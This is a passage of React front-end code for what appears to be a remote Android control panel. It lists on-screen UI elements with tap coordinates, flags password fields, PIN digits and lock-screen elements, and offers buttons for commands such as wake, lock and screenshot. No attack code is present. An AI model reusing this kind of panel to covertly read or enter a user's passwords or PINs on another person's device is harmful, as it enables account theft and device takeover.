      borderLeft: `3px solid ${bl}`,
      borderRadius: 8, padding: '6px 10px', paddingLeft: 10 + (n.depth || 0) * 4,
      marginBottom: 3, cursor: n.clickable ? 'pointer' : 'default',
    }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', gap: 6 }}>
        <div style={{ flex: 1, minWidth: 0 }}>
          {n.text && (
            <div style={{ fontWeight: 600, fontSize: 12, marginBottom: 2, wordBreak: 'break-word',
              color: n.password ? '#ff5c80' : 'var(--text)' }}>
              {n.password ? '🔑 ' : ''}{n.text}
            </div>
          )}
          <div style={{ fontSize: 9, color: 'var(--text3)', fontFamily: 'var(--mono)',
                        overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
            {n.cls.split('.').pop()}{n.id ? ` #${n.id.split('/').pop()}` : ''}
          </div>
        </div>
        <div style={{ display: 'flex', gap: 3, flexWrap: 'wrap', justifyContent: 'flex-end', flexShrink: 0 }}>
          {n.clickable  && <Pill color="#d4950a">CLICK</Pill>}
          {n.editable   && <Pill color="#3b7af0">EDIT</Pill>}
          {n.password   && <Pill color="#e03060">PWD</Pill>}
          {n.scrollable && <Pill color="#3b7af0">SCROLL</Pill>}
          {n.checked    && <Pill color="#00c864">✓</Pill>}
          {!n.enabled   && <Pill color="#64748b">OFF</Pill>}
          {n.isPinDigit && <Pill color="#a855f7">PIN</Pill>}
          {n.isLockEl   && <Pill color="#64748b">LOCK</Pill>}
        </div>
      </div>
      {n.bounds && (
        <div style={{ fontSize: 9, color: 'var(--text3)', marginTop: 3, fontFamily: 'var(--mono)' }}>
          x:{n.bounds.x} y:{n.bounds.y} {n.bounds.w}×{n.bounds.h}
          {n.clickable && (
            <span style={{ color: 'var(--text2)', marginLeft: 6 }}>
              →tap({Math.round(n.bounds.x+n.bounds.w/2)},{Math.round(n.bounds.y+n.bounds.h/2)})
            </span>
          )}
        </div>
      )}
    </div>
  );
}

function SectionHdr({ icon, label }) {
  return (
    <div style={{ display: 'flex', alignItems: 'center', gap: 6, marginTop: 14, marginBottom: 6,
      fontSize: 10, fontWeight: 700, color: 'var(--gold)', letterSpacing: 1.5, textTransform: 'uppercase' }}>
      <span>{icon}</span>{label}
      <div style={{ flex: 1, height: 1, background: 'rgba(212,149,10,.2)', marginLeft: 4 }} />
    </div>
  );
}

function CtrlBtn({ label, state, onClick }) {
  return (
    <div onClick={onClick} style={{
      background: 'linear-gradient(135deg,rgba(55,32,5,.9),rgba(38,24,3,.9))',
      border: '1px solid rgba(212,149,10,.22)', borderRadius: 10,
      padding: '11px 16px', marginBottom: 5, cursor: 'pointer', textAlign: 'center',
    }}>
      <div style={{ fontWeight: 700, fontSize: 13, color: '#e8e0d0' }}>{label}</div>
      {state != null && (
        <div style={{ fontSize: 9, marginTop: 2,
          color: state === 'true' ? '#00c864' : 'rgba(200,190,180,.3)' }}>{state}</div>
      )}
    </div>
  );
}

function NavGrid({ sendCmd }) {
  return (
    <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4,1fr)', gap: 5 }}>
      {[['◀','BACK'],['⌂','HOME'],['⧉','RECENTS'],['💡','WAKEUP'],
        ['🔔','NOTIFICATIONS'],['⚙','QUICK_SETTINGS'],['🔒','LOCK_DEVICE'],['📷','SNAP_SCREEN'],
      ].map(([icon, action]) => (
        <button key={action} className="btn btn-ghost btn-sm btn-block"
          onClick={() => sendCmd(action)}>{icon}</button>
      ))}
    </div>
  );
}

function bs(extra = {}) {
  return { padding: '5px 10px', fontSize: 11, fontWeight: 700, borderRadius: 7,
    border: '1px solid rgba(212,149,10,.25)', background: 'var(--bg3)',
    cursor: 'pointer', ...extra };
}
